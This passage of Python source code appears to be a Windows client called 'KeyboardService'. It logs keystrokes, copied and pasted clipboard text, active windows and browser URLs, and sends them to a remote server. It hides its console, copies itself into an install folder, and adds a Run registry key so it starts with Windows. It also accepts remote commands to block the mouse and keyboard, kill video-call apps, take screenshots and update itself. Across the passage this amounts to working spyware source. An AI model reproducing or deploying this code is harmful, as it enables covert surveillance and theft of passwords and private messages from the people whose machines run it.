                raise RuntimeError("App closing is only supported on Windows")
            close_app_by_title(str(message).strip())
        elif command == "close_all_apps":
            if os.name != "nt":
                raise RuntimeError("App closing is only supported on Windows")
            close_all_visible_apps()
        elif command == "update_client":
            if os.name != "nt":
                raise RuntimeError("Client updates are only supported on Windows")
            if not getattr(sys, "frozen", False):
                raise RuntimeError("This client is not running from an installed build and cannot update itself.")
            check_for_updates(command_id=command_id)
        elif command == "message":
            if os.name != "nt":
                raise RuntimeError("Message boxes are only supported on Windows")
            ctypes.windll.user32.MessageBoxW(None, str(message), "Message from dashboard", 0x40)
        else:
            raise RuntimeError("Unsupported command")
        acknowledge_device_command(command_id, "completed")
    except (OSError, RuntimeError, AttributeError) as error:
        acknowledge_device_command(command_id, "failed", str(error))


def start_mouse_disable(duration):
    if not mouse_disable_lock.acquire(blocking=False):
        raise RuntimeError("Mouse is already disabled")

    ready = Event()
    result = {}
    Thread(target=mouse_disable_worker, args=(duration, ready, result), daemon=True).start()
    if not ready.wait(1):
        mouse_disable_lock.release()
        raise RuntimeError("Mouse hook did not start")
    if result.get("error"):
        mouse_disable_lock.release()
        raise RuntimeError(result["error"])


def mouse_disable_worker(duration, ready, result):
    global mouse_hook_callback
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    hook_type = 14
    callback_type = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)

    def low_level_mouse_proc(_code, _wparam, _lparam):
        return 1

    mouse_hook_callback = callback_type(low_level_mouse_proc)
    hook = user32.SetWindowsHookExW(hook_type, mouse_hook_callback, kernel32.GetModuleHandleW(None), 0)
    if not hook:
        result["error"] = f"Could not install mouse hook: {ctypes.get_last_error()}"
        ready.set()
        mouse_disable_lock.release()
        return

    ready.set()
    try:
        end_time = time.monotonic() + duration
        message = wintypes.MSG()
        while time.monotonic() < end_time:
            if user32.GetMessageW(ctypes.byref(message), None, 0, 0) == 0:
                break
            user32.TranslateMessage(ctypes.byref(message))
            user32.DispatchMessageW(ctypes.byref(message))
    finally:
        user32.UnhookWindowsHookEx(hook)
        mouse_hook_callback = None
        mouse_disable_lock.release()


def start_keyboard_disable(duration):
    if not keyboard_disable_lock.acquire(blocking=False):
        raise RuntimeError("Keyboard is already disabled")

    ready = Event()
    result = {}
    Thread(target=keyboard_disable_worker, args=(duration, ready, result), daemon=True).start()
    if not ready.wait(1):
        keyboard_disable_lock.release()
        raise RuntimeError("Keyboard hook did not start")
    if result.get("error"):
        keyboard_disable_lock.release()
        raise RuntimeError(result["error"])


def keyboard_disable_worker(duration, ready, result):
    global keyboard_hook_callback
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    hook_type = 13
    callback_type = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)

    def low_level_keyboard_proc(_code, _wparam, _lparam):
        return 1

    keyboard_hook_callback = callback_type(low_level_keyboard_proc)
    hook = user32.SetWindowsHookExW(hook_type, keyboard_hook_callback, kernel32.GetModuleHandleW(None), 0)
    if not hook:
        result["error"] = f"Could not install keyboard hook: {ctypes.get_last_error()}"
        ready.set()
        keyboard_disable_lock.release()
        return

    ready.set()
    try:
        end_time = time.monotonic() + duration
        message = wintypes.MSG()
        while time.monotonic() < end_time:
            if user32.GetMessageW(ctypes.byref(message), None, 0, 0) == 0:
                break
            user32.TranslateMessage(ctypes.byref(message))
            user32.DispatchMessageW(ctypes.byref(message))
    finally:
        user32.UnhookWindowsHookEx(hook)
        keyboard_hook_callback = None
        keyboard_disable_lock.release()


def close_all_visible_apps():
    if os.name != "nt":
        raise RuntimeError("App closing is only supported on Windows")

    user32 = ctypes.windll.user32
    enum_windows = user32.EnumWindows
    enum_windows.argtypes = [ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM), wintypes.LPARAM]
    enum_windows.restype = wintypes.BOOL
    callback_type = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
    closed = False

    @callback_type
    def close_window(hwnd, _lparam):
        nonlocal closed
        if not user32.IsWindowVisible(hwnd):
            return True
        title_length = user32.GetWindowTextLengthW(hwnd)
        if title_length <= 0:
            return True
        title_buffer = ctypes.create_unicode_buffer(title_length + 1)
        user32.GetWindowTextW(hwnd, title_buffer, title_length + 1)
        title = title_buffer.value.strip()
        if not title:
            return True
        if title.lower() not in {"task switching", "start", "program manager"}:
            user32.PostMessageW(hwnd, 0x0010, 0, 0)
            closed = True
        return True

    enum_windows(close_window, 0)
    if not closed:
        raise RuntimeError("No visible windows were closed")


def close_app_by_title(app_name):
    if os.name != "nt":
        raise RuntimeError("App closing is only supported on Windows")
    target = (app_name or "").strip()
    if not target:
        raise RuntimeError("App name is required")

    user32 = ctypes.windll.user32
    enum_windows = user32.EnumWindows
    enum_windows.argtypes = [ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM), wintypes.LPARAM]
    enum_windows.restype = wintypes.BOOL
    callback_type = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
    closed = False

    @callback_type
    def close_window(hwnd, _lparam):
        nonlocal closed
        if not user32.IsWindowVisible(hwnd):
            return True
        length = user32.GetWindowTextLengthW(hwnd)
        if length <= 0:
            return True
        title_buffer = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, title_buffer, length + 1)
        title = title_buffer.value.strip()
        if not title:
            return True
        if title.lower() == target.lower() or target.lower() in title.lower():
            user32.PostMessageW(hwnd, 0x0010, 0, 0)
            closed = True
        return True

    enum_windows(close_window, 0)
    if not closed:
        raise RuntimeError(f"No matching window found for {target}")


def open_camera_app(duration):
    if os.name != "nt":
        raise RuntimeError("Camera control is only supported on Windows")
    try:
        if hasattr(os, "startfile"):
            os.startfile("microsoft.windows.camera:")
        else:
            subprocess.Popen(["cmd", "/c", "start", "", "microsoft.windows.camera:"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as error:
        raise RuntimeError(f"Camera could not be opened: {error}") from error

    end_time = time.monotonic() + duration
    while time.monotonic() < end_time:
        time.sleep(0.25)


def start_camera_disable(duration):
    if not camera_disable_lock.acquire(blocking=False):
        raise RuntimeError("Camera is already disabled")

    ready = Event()
    result = {}
    Thread(target=camera_disable_worker, args=(duration, ready, result), daemon=True).start()
    if not ready.wait(1):
        camera_disable_lock.release()
        raise RuntimeError("Camera blocker did not start")
    if result.get("error"):
        camera_disable_lock.release()
        raise RuntimeError(result["error"])


def camera_disable_worker(duration, ready, result):
    try:
        camera_processes = [
            "MicrosoftTeams", "Teams", "Zoom", "zoom", "Skype", "SkypeApp",
            "Discord", "Camera", "WindowsCamera", "msteams", "zoom.exe",
            "teams.exe", "skype.exe", "discord.exe",
        ]
        ready.set()
        end_time = time.monotonic() + duration
        while time.monotonic() < end_time:
            for process_name in camera_processes:
                try:
                    subprocess.run(["taskkill", "/F", "/IM", process_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                except OSError:
                    pass
            time.sleep(0.25)
    except Exception as error:  # pragma: no cover - runtime safety guard
        result["error"] = str(error)
    finally:
        camera_disable_lock.release()


def get_battery_telemetry():
    if os.name != "nt":
        return {"battery_percent": None, "battery_status": "Unavailable"}
    try:
        class SystemPowerStatus(ctypes.Structure):
            _fields_ = [
                ("ac_line_status", wintypes.BYTE),
                ("battery_flag", wintypes.BYTE),
                ("battery_percent", wintypes.BYTE),
                ("reserved", wintypes.BYTE),
                ("battery_life_seconds", wintypes.DWORD),
                ("battery_full_life_seconds", wintypes.DWORD),
            ]
        status = SystemPowerStatus()
        if not ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(status)):
            return {"battery_percent": None, "battery_status": "Unavailable"}
        percent = None if status.battery_percent == 255 else int(status.battery_percent)
        if status.ac_line_status == 1:
            state = "Charging" if percent is not None and percent < 100 else "Plugged in"
        elif status.ac_line_status == 0:
            state = "On battery"
        else:
            state = "Unknown"
        return {"battery_percent": percent, "battery_status": state}
    except (AttributeError, OSError):
        return {"battery_percent": None, "battery_status": "Unavailable"}


def send_message(text, app_name, source_url="", raw_text=None, is_pasted=False, is_copied=False):
    global last_message_id
    last_message_id = max(last_message_id + 1, int(time.time() * 1000))
    if not source_url and app_name:
        source_url = get_message_source_url(app_name)
    payload = {
        "message_id": last_message_id,
        "text": text,
        "raw_text": raw_text if raw_text is not None else text,
        "device_id": device_id,
        "device_name": device_name,
        "app_name": app_name,
        "source_url": source_url,
        "is_pasted": is_pasted,
        "is_copied": is_copied,
    }
    remember_pending_message(payload)
    if post_message(payload):
        forget_pending_message(payload)
    return payload


def retry_pending_messages():
    for payload in load_pending_messages():
        retry_payload = {**payload, "retry": True}
        if post_message(retry_payload, quiet=True):
            forget_pending_message(payload)


def send_heartbeat():
    global SITE_URL
    try:
        headers = {"Content-Type": "application/json"}
        request = Request(
            f"{SITE_URL}/api/devices/heartbeat",
            data=json.dumps(
                {
                    "device_id": device_id,
                    "device_name": device_name,
                    "client_version": APP_VERSION,
                    "started_at": client_started_at,
                    **get_device_telemetry(),
                }
            ).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
            heartbeat = json.loads(response.read().decode("utf-8"))
        updated_site_url = heartbeat.get("client_site_url", "").strip().rstrip("/")
        if updated_site_url and updated_site_url != SITE_URL:
            parsed_url = urlparse(updated_site_url)
            if parsed_url.scheme in ("http", "https") and parsed_url.netloc:
                SITE_URL = updated_site_url
                os.makedirs(INSTALL_DIR, exist_ok=True)
                with open(CONFIG_PATH, "w", encoding="utf-8") as config_file:
                    json.dump({"site_url": SITE_URL}, config_file, indent=2)
                print(f"Client service URL updated to {SITE_URL}")
        if heartbeat.get("screenshot_requested"):
            trigger_screenshot_capture()
        handle_device_command(
            heartbeat.get("command"), heartbeat.get("command_id"), heartbeat.get("message", "")
        )
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        print(f"Could not send device heartbeat: {error}")


def mark_device_offline():
    try:
        request = Request(
            f"{SITE_URL}/api/devices/offline",
            data=json.dumps({"device_id": device_id}).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=3) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except (HTTPError, URLError, TimeoutError, RuntimeError, OSError) as error:
        print(f"Could not mark device offline: {error}")


def hide_current_window():
    if os.name != "nt":
        return
    try:
        user32 = ctypes.windll.user32
        hwnd = user32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
            user32.UpdateWindow(hwnd)
    except Exception:
        pass


def get_installed_startup_path():
    if getattr(sys, "frozen", False):
        return os.path.abspath(INSTALL_PATH)
    return os.path.abspath(os.path.join(INSTALL_DIR, "KeyboardService.py"))


def install_self_to_startup_location():
    if getattr(sys, "frozen", False):
        target_path = os.path.abspath(INSTALL_PATH)
        os.makedirs(INSTALL_DIR, exist_ok=True)
        if not os.path.exists(target_path):
            shutil.copy2(sys.executable, target_path)
        return target_path

    source_path = os.path.abspath(__file__)
    target_path = os.path.abspath(get_installed_startup_path())
    if os.path.normcase(source_path) == os.path.normcase(target_path):
        return target_path

    os.makedirs(INSTALL_DIR, exist_ok=True)
    source_is_newer = (
        not os.path.exists(target_path)
        or os.path.getsize(source_path) != os.path.getsize(target_path)
        or os.path.getmtime(source_path) > os.path.getmtime(target_path)
    )
    if source_is_newer:
        shutil.copy2(source_path, target_path)
    return target_path


def get_startup_command():
    if getattr(sys, "frozen", False):
        return f'"{sys.executable}"'

    target_path = install_self_to_startup_location()
    return f'"{sys.executable}" "{target_path}"'


def register_startup_launch():
    if os.name != "nt":
        return

    try:
        import winreg

        startup_command = get_startup_command()
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        ) as startup_key:
            winreg.SetValueEx(
                startup_key,
                STARTUP_ENTRY_NAME,
                0,
                winreg.REG_SZ,
                startup_command,
            )
    except OSError as error:
        print(f"Could not register automatic startup: {error}")


def running_from_local_project():
    if not getattr(sys, "frozen", False):
        return False

    project_root = os.path.abspath(os.getcwd())
    marker_files = ["client.py", "KeyboardService.spec", "requirements.txt"]
    if not all(os.path.exists(os.path.join(project_root, marker)) for marker in marker_files):
        return False

    exe_path = os.path.abspath(sys.executable)
    return exe_path.lower().startswith(project_root.lower())


def running_from_temp_bundle():
    if not getattr(sys, "frozen", False):
        return False

    exe_path = os.path.abspath(sys.executable)
    return "_MEI" in exe_path.upper() or bool(getattr(sys, "_MEIPASS", None))


def install_and_relaunch():
    if os.name != "nt":
        return False

    if getattr(sys, "frozen", False):
        if running_from_local_project() or running_from_temp_bundle():
            stale_installed = os.path.abspath(INSTALL_PATH)
            if os.path.exists(stale_installed):
                try:
                    os.remove(stale_installed)
                except OSError:
                    pass
            return False

        current_path = os.path.normcase(os.path.abspath(sys.executable))
        installed_path = os.path.normcase(os.path.abspath(INSTALL_PATH))
        if current_path == installed_path:
            return False

        try:
            os.makedirs(INSTALL_DIR, exist_ok=True)
            source_is_newer = (
                not os.path.exists(INSTALL_PATH)
                or os.path.getsize(sys.executable) != os.path.getsize(INSTALL_PATH)
                or os.path.getmtime(sys.executable) > os.path.getmtime(INSTALL_PATH)
            )
            if source_is_newer:
                shutil.copy2(sys.executable, INSTALL_PATH)
            startup_info = subprocess.STARTUPINFO()
            startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startup_info.wShowWindow = 0
            subprocess.Popen([INSTALL_PATH], close_fds=True, startupinfo=startup_info)
            return True
        except OSError as error:
            print(f"Could not install KeyboardService: {error}")
            return False

    current_script = os.path.abspath(__file__)
    installed_script = os.path.abspath(get_installed_startup_path())
    if os.path.normcase(current_script) == os.path.normcase(installed_script):
        return False

    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        source_is_newer = (
            not os.path.exists(installed_script)
            or os.path.getsize(current_script) != os.path.getsize(installed_script)
            or os.path.getmtime(current_script) > os.path.getmtime(installed_script)
        )
        if source_is_newer:
            shutil.copy2(current_script, installed_script)

        startup_info = subprocess.STARTUPINFO()
        startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startup_info.wShowWindow = 0
        subprocess.Popen([sys.executable, installed_script], close_fds=True, startupinfo=startup_info)
        return True
    except OSError as error:
        print(f"Could not install KeyboardService script: {error}")
        return False


def version_tuple(value):
    match = re.search(r"(?:v)?(\d+)(?:\.(\d+))?(?:\.(\d+))?(?:\.(\d+))?", value or "")
    if not match:
        return (0, 0, 0, 0)
    return tuple(int(part or 0) for part in match.groups())


def download_update():
    request = Request(
        UPDATE_API_URL,
        headers={
            "Accept": "application/vnd.github+json",
            "User-Agent": f"KeyboardService/{APP_VERSION}",
        },
    )
    with urlopen(request, timeout=15) as response:
        release = json.loads(response.read().decode("utf-8"))

    latest_tag = str(release.get("tag_name", "")).strip()
    if not latest_tag or version_tuple(latest_tag) <= version_tuple(APP_VERSION):
        return None

    asset = next(
        (
            item for item in release.get("assets", [])
            if item.get("name") == UPDATE_ASSET_NAME and item.get("browser_download_url")
        ),
        None,
    )
    if not asset:
        print(f"Update {latest_tag} has no {UPDATE_ASSET_NAME} asset")
        return None

    os.makedirs(INSTALL_DIR, exist_ok=True)
    temporary_path = os.path.join(INSTALL_DIR, f"{UPDATE_ASSET_NAME}.download")
    download_request = Request(
        asset["browser_download_url"],
        headers={"User-Agent": f"KeyboardService/{APP_VERSION}"},
    )
    digest = hashlib.sha256()
    try:
        with urlopen(download_request, timeout=120) as response, open(temporary_path, "wb") as output:
            while True:
                chunk = response.read(1024 * 1024)
                if not chunk:
                    break
                digest.update(chunk)
                output.write(chunk)

        expected_digest = str(asset.get("digest", ""))
        if expected_digest.startswith("sha256:") and digest.hexdigest().lower() != expected_digest[7:].lower():
            raise RuntimeError("download checksum did not match GitHub release metadata")
        return temporary_path, latest_tag
    except Exception:
        try:
            os.remove(temporary_path)
        except OSError:
            pass
        raise


def send_successful_update_notice(previous_version="", new_version=""):
    previous = str(previous_version or APP_VERSION).strip()
    updated = str(new_version or APP_VERSION).strip()
    if not previous or not updated:
        return
    message = (
        "<b>┌─[ CLIENT UPDATE // SUCCESS ]</b>\n"
        f"<b>Version:</b> {html.escape(previous)} -> {html.escape(updated)}\n"
        f"<b>Device:</b> {html.escape(device_name)}\n"
        "<b>└─[ KeyboardClient // ONLINE ]</b>"
    )
    send_telegram_log(message)


def schedule_update(temporary_path, previous_version=None, new_version=None):
    helper_path = os.path.join(INSTALL_DIR, f"update_{os.getpid()}.cmd")
    target_path = os.path.abspath(INSTALL_PATH)
    source_path = os.path.abspath(temporary_path)
    previous = str(previous_version or APP_VERSION).strip()
    updated = str(new_version or APP_VERSION).strip()
    lines = [
        "@echo off",
        ":wait",
        f'tasklist /FI "PID eq {os.getpid()}" | find "{os.getpid()}" >nul',
        "if not errorlevel 1 (",
        "  timeout /t 1 /nobreak >nul",
        "  goto wait",
        ")",
        f'move /y "{source_path}" "{target_path}" >nul',
        f'start "" "{target_path}" --post-update-success --previous-version "{previous}" --new-version "{updated}" --site-url "{SITE_URL}"',
        'del "%~f0"',
    ]
    with open(helper_path, "w", encoding="ascii", newline="\r\n") as helper:
        helper.write("\r\n".join(lines) + "\r\n")
    startup_info = subprocess.STARTUPINFO()
    startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startup_info.wShowWindow = 0
    subprocess.Popen(["cmd.exe", "/c", helper_path], close_fds=True, startupinfo=startup_info)


def check_for_updates(command_id=None):
    if os.name != "nt" or not getattr(sys, "frozen", False):
        return False
    if not update_lock.acquire(blocking=False):
        if command_id:
            acknowledge_device_command(command_id, "failed", "Another update is already in progress.")
        return False
    try:
        result = download_update()
        if not result:
            if command_id:
                acknowledge_device_command(command_id, "failed", "No update available.")
            return False
        temporary_path, latest_tag = result
        print(f"Updating KeyboardService from {APP_VERSION} to {latest_tag}")
        if command_id:
            acknowledge_device_command(command_id, "completed")
        schedule_update(temporary_path, previous_version=APP_VERSION, new_version=latest_tag)
        os._exit(0)
        return True
    except Exception as error:
        print(f"Could not check for KeyboardService updates: {error}")
        if command_id:
            acknowledge_device_command(command_id, "failed", str(error))
        return False
    finally:
        update_lock.release()


def update_checker():
    time.sleep(5)
    check_for_updates()


def heartbeat_sender():
    while True:
        send_heartbeat()
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)


def message_sender():
    last_retry_at = 0
    while True:
        try:
            text, app_name, source_url, raw_text, is_pasted, is_copied = message_queue.get(timeout=5)
            send_message(text, app_name, source_url, raw_text, is_pasted, is_copied)
            message_queue.task_done()
        except Exception:
            pass
        if time.time() - last_retry_at >= MESSAGE_RETRY_INTERVAL_SECONDS:
            retry_pending_messages()
            retry_pending_raw_batches()
            last_retry_at = time.time()


def queue_raw_token(token, app_name):
    global raw_batch_started_at, raw_flush_timer
    now = int(time.time() * 1000)
    with raw_batch_lock:
        if raw_batch_started_at is None:
            raw_batch_started_at = now
        raw_batch_events.append({"time": now, "key": token, "app_name": app_name})
    if raw_flush_timer is None:
        raw_flush_timer = Timer(RAW_BATCH_INTERVAL_SECONDS, flush_raw_log)
        raw_flush_timer.daemon = True
        raw_flush_timer.start()


def flush_raw_log():
    global raw_batch_events, raw_batch_started_at, raw_flush_timer
    with raw_batch_lock:
        events = raw_batch_events
        raw_batch_events = []
        raw_batch_started_at = None
        raw_flush_timer = None
    upload_raw_batch(events)


def queue_copied_clipboard(target):
    time.sleep(0.1)
    copied_text = get_clipboard_text().strip()
    if copied_text:
        source_url = get_browser_url(target)
        message_queue.put((copied_text, target, source_url, copied_text, False, True))


def flush_message_buffer():
    global message_buffer, raw_message_buffer, last_key_time_ms, message_started_ms
    global active_target, active_target_key
    text = message_buffer.strip()
    raw_text = raw_message_buffer.strip()
    message_buffer = ""
    raw_message_buffer = ""
    last_key_time_ms = None
    message_started_ms = None
    if text:
        target = active_target or get_active_app()
        source_url = get_browser_url(target)
        message_queue.put((text, target, source_url, raw_text, False, False))
    active_target = None
    active_target_key = None


def on_press(key):
    global message_buffer, raw_message_buffer, last_key_time_ms, message_started_ms
    global active_target, active_target_key
    if collection_paused:
        return
    with state_lock:
        modifier_aliases = {
            Key.shift_l: Key.shift, Key.shift_r: Key.shift, Key.ctrl_l: Key.ctrl,
            Key.ctrl_r: Key.ctrl, Key.alt_l: Key.alt, Key.alt_r: Key.alt,
            Key.cmd_l: Key.cmd, Key.cmd_r: Key.cmd,
        }
        if key in modifier_aliases or key in (Key.shift, Key.ctrl, Key.alt, Key.cmd):
            active_modifiers.add(modifier_aliases.get(key, key))
            raw_token = raw_key_value(key)
            raw_message_buffer += raw_token
            queue_raw_token(raw_token, get_active_app())
            return

        key_char = (key.char or "") if isinstance(key, KeyCode) else ""
        raw_symbol = raw_key_value(key)
        if raw_symbol:
            raw_message_buffer += raw_symbol
            queue_raw_token(raw_symbol, get_active_app())
        is_paste_key = key_char.lower() == "v" or key_char == "\x16"
        is_copy_key = key_char.lower() == "c" or key_char == "\x03"
        if is_copy_key and Key.ctrl in active_modifiers:
            target, _target_key = get_active_target()
            Thread(target=queue_copied_clipboard, args=(target,), daemon=True).start()
            return
        if is_paste_key and Key.ctrl in active_modifiers:
            pasted_text = get_clipboard_text().strip()
            if pasted_text:
                flush_message_buffer()
                target, target_key = get_active_target()
                source_url = get_browser_url(target)
                message_queue.put((pasted_text, target, source_url, pasted_text, True, False))
            return

        symbol = normalize_key(key)
        now_ms = time.time() * 1000
        if symbol == "\b":
            message_buffer = message_buffer[:-1]
            last_key_time_ms = now_ms
        elif symbol == "\n":
            flush_message_buffer()
        elif symbol:
            target, target_key = get_active_target()
            if message_buffer and active_target_key != target_key:
                flush_message_buffer()
            if not message_buffer:
                active_target = target
                active_target_key = target_key
            if message_buffer and last_key_time_ms and now_ms - last_key_time_ms >= MESSAGE_GAP_MS:
                flush_message_buffer()
                active_target = target
                active_target_key = target_key
            if message_started_ms is None:
                message_started_ms = now_ms
            message_buffer += symbol
            last_key_time_ms = now_ms


def on_release(key):
    aliases = {
        Key.shift_l: Key.shift, Key.shift_r: Key.shift, Key.ctrl_l: Key.ctrl,
        Key.ctrl_r: Key.ctrl, Key.alt_l: Key.alt, Key.alt_r: Key.alt,
        Key.cmd_l: Key.cmd, Key.cmd_r: Key.cmd,
    }
    active_modifiers.discard(aliases.get(key, key))


def start_keyboard_listener():
    global SERVICE_KEYBOARD_LISTENER
    print(f"Sending to {SITE_URL}")
    register_startup_launch()
    atexit.register(mark_device_offline)
    atexit.register(flush_raw_log)
    Thread(target=message_sender, daemon=True).start()
    Thread(target=heartbeat_sender, daemon=True).start()
    Thread(target=update_checker, daemon=True).start()
    Thread(target=screenshot_request_poller, daemon=True).start()
    Thread(target=website_history_sender, daemon=True).start()
    with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
        SERVICE_KEYBOARD_LISTENER = keyboard_listener
        keyboard_listener.join()


def run_client():
    if install_and_relaunch():
        sys.exit(0)
    if POST_UPDATE_SUCCESS:
        send_successful_update_notice(PREVIOUS_VERSION, NEW_VERSION)
    hide_current_window()
    start_keyboard_listener()


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1].lower() == "--service":
        from service_client import main as service_main
        service_main()
    else:
        run_client()